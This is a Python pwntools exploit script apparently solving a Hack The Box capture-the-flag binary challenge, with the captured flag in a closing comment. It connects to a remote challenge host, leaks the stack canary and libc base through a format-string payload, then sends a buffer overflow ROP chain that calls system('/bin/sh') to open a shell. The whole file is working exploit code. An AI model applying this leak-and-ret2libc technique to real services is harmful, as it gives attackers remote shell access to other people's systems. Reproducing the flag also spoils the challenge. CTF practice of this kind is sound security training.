#!/usr/bin/env python3

from pwn import *

exe = ELF('./super_jumpio_kart')
libc = ELF('./glibc/libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
#return
brva 0x189C
'''

p = remote("94.237.54.192", 58157)
#p = process('./super_jumpio_kart')
#p = gdb.debug('./super_jumpio_kart', gdbscript = script)
#debug()

sa(b"> ", b"4")
payload = b"%9$p.%19$p."
sa(b"Power Up:", payload)

canary = int(rcu(b".")[-19:-1:], 16)
lleak("canary", canary)
libc_base = int(rcu(b".")[-19:-1:], 16) - 0x2a1ca
lleak("libc base", libc_base)

for i in range(7):
	rcu("Warning! ")
	val = p.recvn(1)
	sa(b"ahead: ", val)

sa(b"> ", b"Y")

system = libc_base + libc.symbols['system']
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
payload = b"/bin/sh\x00" + b"A" * 0x40 + p64(canary) + p64(0) * 3 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
sa(b"victory: ", payload)

p.interactive()
#HTB{~~1-2-3-vr00m_vr00m_vr00m~~}
